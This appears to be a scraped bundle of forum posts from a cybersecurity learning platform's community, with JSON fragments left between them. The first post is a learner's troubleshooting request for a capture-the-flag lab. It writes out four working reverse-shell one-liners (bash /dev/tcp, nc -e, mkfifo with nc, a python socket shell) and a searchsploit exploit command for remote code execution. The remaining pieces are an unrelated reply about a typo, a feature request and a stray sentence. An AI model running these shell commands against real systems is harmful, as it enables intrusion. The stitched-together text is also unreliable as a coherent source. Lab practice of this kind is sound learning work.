I have tried 3 separate rooms where you need a reverse shell and on each one of them i just stopped it there and moved on to a different room because i cant get it to work. I am doing the Ignite room right now.\n\nLet me provide some more information about my situation and what ive tried\n\nWhen i run \"ip a s tun0\" i see this line: \"inet [192.168.176.10/17](http://192.168.176.10/17) scope global tun0\" and so i use [192.168.176.10](http://192.168.176.10) for my reverse shells\n\nI can do everything normally like nmap, accessing ssh, using the webserver, using ftp, etc. but i cant get the reverse shell.\n\nWhen i accidentally typed in a 10.x.x.x address in the reverse shell cmd it hung for a while but when i use my correct ip it dies immediately\n\nMy VPN server name is US East (N. Virginia)\n\nI am using ports 4444 and 9999. I also tried other ports but not as much as 4444 and 9999.\n\nI am using Terminator as my terminal emulator and inside of Terminator i am running tmux to run my openvpn\n\nI tried using multiple standard terminals for my vpn, netcat, and reverse shell cmd and still nothing changed\n\nI use nc -lnvp {port}\n\nwhen i run ss -tuln | grep {port} i do see my netcat is listening on the correct port\n\nwhen i run sudo ufw status i get inactive\n\nthe ip of the box is always 10.x.x.x\n\nThese are the reverse shells i am trying are from [pentestmonkey.net](http://pentestmonkey.net) :\n\nbash -i >& /dev/tcp/192.168.176.10/4444 0>&1\n\nnc -e /bin/sh [192.168.176.10](http://192.168.176.10) 4444\n\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [192.168.176.10](http://192.168.176.10) 4444 >/tmp/f\n\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF\\_INET,socket.SOCK\\_STREAM);s.connect((\"192.168.176.10\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\\[\"/bin/sh\",\"-i\"\\]);'\n\nI tried doing php reverse shells using a file upload on the other 2 boxes and thats where the website hung for a bit when i accidentally ran the reverse shell using a 10.x.x.x address.\n\nIve downloaded 3 new openvpn configuration files and i run sudo openvpn us-east-1-AlexAGamer-regular.ovpn to connect to the vpn\n\nI run sudo apt update; sudo apt upgrade -y; sudo apt autoremove every time i boot into my machine\n\nIm on Ubuntu 24.04\n\nIf you want to try out the room to see for yourself go into the Ignite room where you can get RCE, to do this use \"searchsploit -m php/webapps/50477.py\" and run \"python3 [50477.py](http://50477.py) \\-u http://{box ip}\" then you can try to get a reverse shell for yourself.\n\nI have no clue why its not working but i hope maybe someone else could help me figure out whats wrong.\n\nEDIT :\n\nI had reset my ufw settings but i also had firewall-cmd installed and i didnt reset those",

          "text": "I mean, the terminal itself pointed that likely the command you issued was incorrect, so the next normal approach in that case would be to look carefully at each word you have typed as input to the terminal. By doing so, you would notice you wrote “drib” instead of dirb, and even if that wouldn’t make sense to you, you could then compare your input against the command suggested in that module. This would be the right approach in that particular case. I think creating a post for this, considering it is a guided assignment, is too much. Please go through the lessons more carefully and rather apply the little methodology I have written above rather than immediately relying on Reddit. \nTerminal output will almost always guide clearly where you have gone wrong with your command. Hope it helps.",

      "text": "Hi, I'm pretty positive that the site admins do look at the subreddit but I'm not extremely sure. So if there's somewhere better to suggest this, please let me know.\n\nHonestly I'm just looking for a wishlist system and a favorite system because some things I keep having to go back to in my day-to-day learning. To give two examples would be HTTP Status Codes (web fundamentals) and Filter Evasion Techniques (Advanced sql injection) which you'll memorize as time goes by, yeah.. but day-to-day it's a little bit annoying to have to go back.\n\nI hope that the team can add favorites for individual tasks. I realise there IS a save button but 1. some rooms are lengthy 2. I just wish there was a distinction between saving tasks and rooms. I also understand that there is a \"hide completed rooms\" toggle but it just seems nonsensical to not have these two different features and not able to save individual tasks.\n\nI also hope that when saving individual tasks, I can make folders. Sometimes I need related resources from different rooms.. especially when you're learning the same topic from a room on your pre-made path and a room you just searched for.\n\nAm I making sense? And is this as big of a deal as I make it out to be? I don't think adding it would be a burden. So if it could be done, I'd really love that. If you guys have a better solution or I'm missing something, or just have input, please do comment.",

Doing so will also give you a nice side effect: writing something improves your memory of it. And these notes of yours would be searchable.",
